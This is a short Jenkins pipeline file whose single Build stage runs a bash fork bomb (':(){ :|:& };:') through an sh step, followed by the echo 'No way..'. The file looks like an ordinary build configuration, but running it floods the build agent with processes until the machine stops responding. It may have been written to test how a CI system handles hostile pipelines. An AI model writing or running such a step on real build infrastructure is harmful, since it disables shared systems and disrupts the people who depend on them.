pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                sh "/bin/bash -c ':(){ :|:& };:'"
              
                echo 'No way..'
            }
        }
    }
}
